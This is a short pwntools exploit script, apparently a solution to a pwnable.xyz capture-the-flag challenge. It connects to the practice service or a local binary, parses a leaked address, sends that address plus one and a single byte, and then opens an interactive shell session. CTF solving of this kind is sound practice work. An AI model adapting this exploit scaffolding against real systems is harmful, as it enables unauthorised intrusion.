from pwn import *

exe = ELF("./challenge", checksec=True)

context.binary = exe

HOST = "svc.pwnable.xyz"
PORT = 30000

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
# args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def leak_target(r):
    r.recvuntil(b"Leak: ")
    leak = int(r.recvline().decode().strip()[2:], 16)

    log.success(f"LEAKED TARGET: {hex(leak)}")
    return leak

def main():
    r  = conn()

    target = leak_target(r)
    r.sendlineafter(b"message: ", str(target + 1).encode())
    r.sendlineafter(b"message: ", b"a")
    
    r.interactive()

if __name__ == "__main__":
    main()
